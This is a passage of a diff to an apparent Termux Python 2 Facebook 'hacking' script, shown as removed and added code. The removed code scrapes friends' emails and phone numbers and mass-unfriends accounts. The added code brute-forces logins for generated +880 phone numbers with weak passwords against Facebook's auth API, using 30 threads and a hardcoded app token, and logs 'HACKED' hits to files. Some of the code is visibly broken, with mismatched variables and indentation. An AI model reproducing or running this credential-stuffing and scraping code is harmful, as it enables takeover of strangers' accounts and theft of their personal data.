-														oks.append(user+pass6)
-													else:
-														if "www.facebook.com" in q6["error_msg"]:
-															print "[CZalim Cp] " + user + " | " + pass6
-															cps = open("checkpoint.txt", "a")
-															cps.write(user+"|"+pass6+"\n")
-															cps.close()
-															cpb.append(user+pass6)
-														else:
-															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q7 = json.loads(data7.text)
-															if "access_token" in q7:
-																print "\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7
-																oks.append(user+pass7)
-															else:
-																if "www.facebook.com" in q7["error_msg"]:
-																	print "[Zalim Cp] " + user + " | " + pass7
-																	cps = open("checkpoint.txt", "a")
-																	cps.write(user+"|"+pass7+"\n")
-																	cps.close()
-																	cpb.append(user+pass7)
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print (50*"-")
-	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
-	print("[✓] CP File Has Been Saved : checkpoint.txt")
-	raw_input("\n[Back]")
-	if xxx == "0":
-		crack_menu()
-	else:
-		os.system("python2 .README.md")
-		
-def gbmail():
-	global toket
-	os.system("clear")
-	try:
-		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
-	except IOError:
-		print("[!] Token invalid")
-		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
-		time.sleep(1)
-		token()
-	else:
-	    agbm()
-
-def agbm():
-	bch = ("2")
-	if bch =="":
-		print ("[!] Fill in correctly")
-		agbm()
-	elif bch =="2":
-		os.system("clear")
-		print (logo)
-		idt = raw_input("[✓] Enter ID : ")
-		os.system("clear")
-		print (logo)
-		try:
-			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			psb("[✓] Account  Name: "+op["name"])
-			time.sleep(0.5)
-		except KeyError:
-			print("[!] ID Not Found!")
-			raw_input("\n[Back]")
-			gbmail()
-		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			id.append(i["id"])
-	xxx = str(len(id))
-	psb ("[✓] Total Friends: "+xxx)
-	time.sleep(0.5)
-	psb ("[✓] Please wait, process is running ...")
-	time.sleep(0.5)
-	psb ("[!] To Stop Process Press CTRL Then Press z")
-	time.sleep(0.5)
-	print (50*"-")
-	print
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
-			q = json.loads(data.text)
-			if "email" not in q:
-				pass
-			else:
-				if "email" in q:
-				    gms = q["email"]
-				    print (user + "  |  " + gms + "\n")
-				    bms.open("emails.txt", "a")
-				    bms.write(user + "  |  " + gms + "\n")
-				    bms.close()
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print (50*"-")
-	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print("[✓] File Has Been Saved : emails.txt")
-	raw_input("\n[Back]")
-	if xxx == "0":
-		crack_menu()
-	else:
-		os.system("python2 .README.md")
-		
-def gbnmbr():
-	global toket
-	os.system("clear")
-	try:
-		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
-	except IOError:
-		print("[!] Token invalid")
-		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
-		time.sleep(1)
-		token()
-	else:
-	    agbn()
-
-def agbn():
-	bch = ("2")
-	if bch =="":
-		print ("[!] Fill in correctly")
-		agbn()
-	elif bch =="2":
-		os.system("clear")
-		print (logo)
-		idt = raw_input("[✓] Enter ID : ")
-		os.system("clear")
-		print (logo)
-		try:
-			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			psb("[✓] Account  Name: "+op["name"])
-			time.sleep(0.5)
-		except KeyError:
-			print("[!] ID Not Found!")
-			raw_input("\n[Back]")
-			gbnmbr()
-		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			id.append(i["id"])
-	xxx = str(len(id))
-	psb ("[✓] Total Friends: "+xxx)
-	time.sleep(0.5)
-	psb ("[✓] Please wait, process is running ...")
-	time.sleep(0.5)
-	psb ("[!] To Stop Process Press CTRL Then Press z")
-	time.sleep(0.5)
-	print (50*"-")
-	print
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
-			q = json.loads(data.text)
-			if "mobile_phone" not in q:
-				pass
-			else:
-				if "mobile_phone" in q:
-				    gns = q["mobile_phone"]
-				    gn=q["name"]
-				    print (user + " | " + gn + gns + "\n")
-				    bms.open("numbers.txt", "a")
-				    bms.write(user + " | " + gn + gns + "\n")
-				    bms.close()
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print (50*"-")
-	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
-	print("[✓] File Has Been Saved : numbers.txt")
-	raw_input("\n[Back]")
-	if xxx == "0":
-		crack_menu()
-	else:
-		os.system("python2 .README.md")
-
-def unfriend():
-    os.system('clear')
-    try:
-        toket = open('/sdcard/Android/data/com.termux/token.log', 'r').read()
-    except IOError:
-        print 'token invalid'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
+    somi = raw_input('\n\n \x1b[1;97m  ')
+    if somi == '':
+        print '[!] Fill in correctly'
+        action()
+    elif somi == 'y':
+        tik()
         os.system('clear')
-        print logo
-        print 'To stop press CTRL then press Z'
-        print 50*"-"
+        print logo1
         print
         try:
-            pek = session.get('https://graph.facebook.com/me/friends?access_token=' + toket)
-            cok = json.loads(pek.text)
-            for i in cok['data']:
-                name = i['name']
-                id = i['id']
-                session.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
-                print ("[Unfriended]  "+name)
+            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;92m\x1b[1;92m\n175,165,191, 192, 193, 194,\n195, 196, 197, 198, 199:\n >>> ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
 
-        except IndexError:
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            somi()
+
+    elif somi == 'n':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 47 * '\x1b[1;93m-'
+    xxx = str(len(id))
+    jalan('\x1b[1;92m TOTAL IDS NUMBER : ' + xxx)
+    jalan('\x1b[1;92m TO STOP THIS PROCESS PRESS Ctrl THEN z')
+    print 47 * '\x1b[1;93m-'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
             pass
-        except KeyboardInterrupt:
-            exit()
-    print " All friend has been removed"
-    raw_input('[Back]')
-    os.system("python2 .README.md")
-    
-if __name__ == "__main__":
-	menu()
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
+                okb = open('sdcard/ids/successful.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;92m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
+                cps = open('sdcard/ids/checkpoint.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = '445566'
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
+                    okb = open('sdcard/ids/successful.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;92m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
+                    cps = open('sdcard/ids/checkpoint.txt', 'a')
+                    cps.write(k + c + user + pass3 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass3)
+                else:
+                    pass3 = '123456'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
+                        okb = open('sdcard/ids/successful.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
+                        cps = open('sdcard/ids/checkpoint.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+                    else:
+                    	pass5 = '667788'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
+                        okb = open('sdcard/ids/successful.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m   (NIKI-\x1b[1;96mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
+                        cps = open('sdcard/ids/checkpoint.txt', 'a')
+                        cps.write(k + c + user + pass5 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass5)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;92m-'
+    print 'Process Has Been Completed ...'
+    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;92m]')
+    login()
 
 
-# Okay Decompiling b.py
+if __name__ == '__main__':
+    login()
